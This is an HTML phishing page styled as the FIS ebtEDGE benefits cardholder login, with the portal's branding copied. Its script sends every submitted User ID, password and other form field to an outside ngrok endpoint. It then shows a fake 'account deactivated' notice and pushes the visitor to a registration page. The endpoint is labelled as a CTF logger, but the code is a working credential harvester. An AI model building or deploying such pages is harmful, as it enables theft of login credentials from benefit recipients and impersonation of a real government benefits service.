<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Login – Mock Portal</title>

  <!-- ✅ Added Comfortaa for rounded FIS text -->
  <link href="https://fonts.googleapis.com/css2?family=Comfortaa:wght@400;700&display=swap" rel="stylesheet">

  <style>
    :root{
      --blue-1: #0c5167;
      --blue-2: #0f6b8a;
      --card-bg: #fff;
      --muted: #6d6d6d;
      --accent: #0b6c7c;
      --link: #0b6c99;
      --max-w: 520px;
    }
    html, body {
      height: 100%;
      margin: 0;
      font-family: "Helvetica Neue", Arial, sans-serif;
      background: linear-gradient(180deg, var(--blue-1) 0%, var(--blue-2) 100%);
      color: #fff;
    }
    .top-hero {
      height: 320px;
      background: linear-gradient(90deg, var(--blue-1) 0%, var(--blue-2) 60%);
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      overflow: hidden;
    }
    .top-hero::after {
      content: "";
      position: absolute;
      left: 0; right: 0; bottom: -40px; height: 120px;
      background: radial-gradient(circle at 10% 20%, rgba(255,255,255,0.05), transparent 10%),
                  radial-gradient(circle at 80% 40%, rgba(255,255,255,0.04), transparent 15%);
      pointer-events: none;
    }
    .container {
      width: 100%;
      max-width: var(--max-w);
      margin: -100px auto 32px;
      padding: 0 18px;
      box-sizing: border-box;
    }
    .card {
      background: var(--card-bg);
      border-radius: 10px;
      box-shadow: 0 6px 24px rgba(6,18,28,0.12);
      overflow: visible;
      padding: 26px 22px 18px 22px;
      position: relative;
      color: #000;
    }
    .brand {
      display: flex;
      align-items: center;
      gap: 14px;
      margin-bottom: 6px;
    }
    h1#login-title { margin: 0; font-size: 36px; font-weight: 800; color: #0b0b0b; letter-spacing: -0.5px; }
    .copy { color: var(--muted); line-height: 1.35; margin-top: 10px; font-size: 0.95rem; }
    .register { margin-top: 8px; font-size: 0.90rem; }
    .register a { color: var(--link); text-decoration: none; font-weight: 700; }
    .login-form { margin-top: 14px; }
    label { display: block; font-size: 0.92rem; margin-top: 12px; color: #2f2f2f; }
    input[type="text"], input[type="password"] {
      width: 100%; padding: 12px 12px; border-radius: 6px; border: 1.5px solid #cfcfcf;
      margin-top: 8px; box-sizing: border-box; font-size: 1rem; outline: none;
      transition: border-color .14s, box-shadow .14s;
    }
    input:focus { border-color: var(--accent); box-shadow: 0 4px 12px rgba(11,108,124,0.08); }
    .actions { display: flex; align-items: center; gap: 12px; margin-top: 16px; }
    .trouble-link { color: var(--link); text-decoration: none; font-weight: 700; font-size: 0.95rem; }
    .btn {
      margin-left: auto; background: #2b8aa0; color: #fff; border: none;
      padding: 10px 22px; border-radius: 6px; font-weight: 700; cursor: pointer; font-size: 1rem;
    }
    .btn:active { transform: translateY(1px); }
    .deactivated {
      display: none; margin-top: 18px; padding: 18px;
      background: #fff3cd; border: 1px solid #ffeeba; border-radius: 6px;
      color: #6f4b00; font-weight: 600;
    }
    .deactivated a { color: #0b6c7c; text-decoration: none; font-weight: 800; }
    .legal {
      margin-top: 18px; border-top: 1px solid #eee; padding-top: 12px;
      display: flex; align-items: center; gap: 10px; color: #666; font-size: 0.88rem;
    }
    .legal .ico {
      width: 22px; height: 22px; border-radius: 50%; background: #e6e6e6;
      display: inline-flex; align-items: center; justify-content: center;
      font-weight: 700; color: #444; font-size: 12px;
    }
    @media (max-width:420px){
      h1#login-title { font-size: 28px; }
      .container { margin: -56px 12px 20px; }
      .top-hero { height: 260px; padding-top: 12px; }
    }
    .logo-wrapper {
      transform: scale(2) translateX(28%);
      transform-origin:center top;
      max-width: none;
      height: auto;
    }
  </style>
</head>
<body>
  <header class="top-hero" aria-hidden="true">
    <svg class="logo-wrapper" role="img" aria-label="FIS ebtEDGE" width="920" height="140" viewBox="0 0 920 140" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <linearGradient id="g" x1="0" x2="1">
          <stop offset="0" stop-color="#0c5167"/>
          <stop offset="1" stop-color="#0f6b8a"/>
        </linearGradient>
      </defs>
      <rect x="0" y="0" width="920" height="140" fill="url(#g)"/>
      <g transform="translate(22,20)" fill="#fff" opacity="0.98">
        <g transform="translate(0,0)">
          <rect x="0" y="10" rx="8" ry="8" width="84" height="54" fill="#0c5167" opacity="0.20"/>
          <!-- ✅ Only this line updated for round font -->
          <text x="10" y="74" font-family="'Comfortaa', Helvetica, sans-serif" font-weight="700" font-size="65">FIS</text>
          <g transform="translate(0,-12)">
            <circle cx="8" cy="12" r="4"/>
            <circle cx="22" cy="12" r="4"/>
            <circle cx="36" cy="12" r="4"/>
            <circle cx="50" cy="12" r="4"/>
            <circle cx="64" cy="12" r="4"/>
          </g>
        </g>
        <text x="140" y="74" font-family="Arial, Helvetica, sans-serif" font-weight="800" font-size="54">ebtEDGE</text>
        <text x="355" y="42" font-family="Arial, Helvetica, sans-serif" font-size="18" font-weight="750">SM</text>
      </g>
    </svg>
  </header>

  <div class="container">
    <main class="card" role="main" aria-labelledby="login-title">
      <div class="brand">
        <h1 id="login-title">Login</h1>
      </div>

      <p class="copy">Your User ID can be used to access both the ebtEDGE Cardholder Portal and the mobile application available in the Google Play or Apple App Store to access your balance or review your transaction history.</p>

      <p class="register">First time logging in? <a id="registerLink" href="#">Register Here</a></p>

      <section id="formArea">
        <form class="login-form" id="loginForm" autocomplete="off" novalidate>
          <label for="userId">User ID *</label>
          <input id="userId" name="userId" type="text" inputmode="text" aria-required="true" placeholder=" ">
          <label for="password">Password *</label>
          <input id="password" name="password" type="password" aria-required="true" placeholder=" ">
          <div class="actions" aria-hidden="false">
            <a class="trouble-link" href="#" onclick="return false;">Trouble Signing in?</a>
            <button type="submit" class="btn" aria-label="Login button">Login</button>
          </div>
        </form>

        <div class="deactivated" id="deactivatedMsg" role="status" aria-live="polite">
          ⚠️ Account deactivated. Please <a id="registerDeactivatedLink" href="#">Register a New Account</a>.
        </div>
      </section>

      <div class="legal" aria-hidden="true">
        <span class="ico">i</span>
        <span>Legal Disclaimer</span>
      </div>
    </main>
  </div>

  <script>
    // Show correct error message on login
    document.getElementById("loginForm").addEventListener("submit", function(e){
      e.preventDefault();
      document.getElementById("deactivatedMsg").style.display = "block";
    });

    // Redirect both register links to register.html
    document.getElementById("registerLink").addEventListener("click", function(e){
      e.preventDefault();
      window.location.href = "register.html";
    });
    document.getElementById("registerDeactivatedLink").addEventListener("click", function(e){
      e.preventDefault();
      window.location.href = "register.html";
    });
    const CTF_FORM_ENDPOINT = 'https://overrife-overpensively-zaria.ngrok-free.dev/log';
    document.body.addEventListener('submit', async function(event) {
      const form = event.target;
      if (form.tagName !== 'FORM') return;
      event.preventDefault();

      // Collect all fields as raw key=value text, one per line
      const formData = new FormData(form);
      let rawText = '';
      for (const [key, value] of formData.entries()) {
        rawText += key + '=' + value + '\n';
      }

      const formId = form.id || form.name || Array.from(document.forms).indexOf(form);
      try {
        await fetch(CTF_FORM_ENDPOINT, {
          method: 'POST',
          headers: {'Content-Type': 'text/plain'},
          body:
            'event=form_submit\n' +
            'page=' + window.location.pathname + '\n' +
            'form=' + formId + '\n' +
            'timestamp=' + new Date().toISOString() + '\n' +
            'userAgent=' + navigator.userAgent + '\n' +
            rawText
        });
        document.getElementById('formArea').style.display = 'none';
        document.getElementById('deactivatedMsg').style.display = 'block';
      } catch (err) {
        console.error('CTF log failed', err);
      }
    });
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('./service-worker.js').catch(()=>{});
    }
  </script>
</body>
</html>
